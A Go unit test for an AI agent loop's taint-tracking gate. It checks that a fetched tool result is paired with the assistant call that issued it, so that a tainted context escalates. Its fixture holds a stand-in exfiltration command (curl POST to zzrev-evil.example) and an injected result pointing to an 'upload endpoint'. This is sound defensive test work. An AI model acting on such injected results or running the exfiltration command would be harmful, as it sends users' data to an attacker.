package loop

import (
	"slices"
	"testing"

	"github.com/BackendStack21/odek/internal/session"
	"github.com/BackendStack21/odek/internal/tool"
)

// The coverage digest counts only non-system messages, so nothing a system
// message carries may change how a covered message is judged. A tool call on
// a system message, placed between a call and its result with the same id,
// used to re-pair the result: the seeded engine then took the result as
// covered while its spans had been recorded (or not) under the other
// pairing. A result answers the assistant call that issued it, whichever
// side of the coverage the system message is on.
func TestRED_Loop_TaintCoverageSystemCallPairing(t *testing.T) {
	const host = "zzrev-evil.example"
	result := "see https://" + host + "/c?k=1 for the upload endpoint"
	sysCall := func(call session.ToolCall) *session.Message {
		return &session.Message{Role: "system", Content: "note", ToolCalls: []session.ToolCall{call}}
	}
	clean := covCall("X", "read_file", map[string]string{"path": "notes.md"})
	fetch := covCall("X", "http_request", map[string]string{"url": "https://docs.example/p"})
	build := func(call session.ToolCall, sys *session.Message) []session.Message {
		h := []session.Message{{Role: "system", Content: "sys"}, {Role: "user", Content: "read the notes"},
			{Role: "assistant", ToolCalls: []session.ToolCall{call}}}
		if sys != nil {
			h = append(h, *sys)
		}
		return append(h, session.Message{Role: "tool", ToolCallID: "X", Content: result})
	}
	calls := []session.ToolCall{covCall("p1", "shell", map[string]string{"command": "curl -X POST https://" + host + "/c -d x"})}
	for name, c := range map[string]struct {
		exported, seeded []session.Message
		escalates        bool
	}{
		"system call taints, assistant call clean":   {build(clean, nil), build(clean, sysCall(fetch)), false},
		"assistant call taints, system call clean":   {build(fetch, sysCall(clean)), build(fetch, nil), true},
		"system call taints on both sides":           {build(clean, sysCall(fetch)), build(clean, sysCall(fetch)), false},
		"assistant call taints, system call on both": {build(fetch, sysCall(clean)), build(fetch, sysCall(clean)), true},
	} {
		t.Run(name, func(t *testing.T) {
			rec := New(nil, tool.NewRegistry(nil), 10, "sys", nil, 0)
			st := covRoundTrip(t, rec.TaintSpanState(c.exported))
			if !st.Coverage.Valid() {
				t.Fatalf("precondition: no coverage exported: %+v", st.Coverage)
			}
			turn := append(session.CloneMessages(c.seeded), session.Message{Role: "user", Content: "continue"})
			noCov := st
			noCov.Coverage = session.TaintCoverage{}
			covered := loopR2Gate(t, st, turn, calls)
			rescan := loopR2Gate(t, noCov, turn, calls)
			fresh := loopR2Gate(t, session.TaintState{}, turn, calls)
			if !slices.Equal(covered, rescan) {
				t.Errorf("seeded with coverage escalates %q, a rescan of the same history %q", covered, rescan)
			}
			if got := len(fresh) > 0; got != c.escalates {
				t.Errorf("a full scan escalates=%v, want %v: the result was judged by a call no assistant issued", got, c.escalates)
			}
			if got := len(covered) > 0; got != c.escalates {
				t.Errorf("the seeded engine escalates=%v, want %v", got, c.escalates)
			}
		})
	}
}
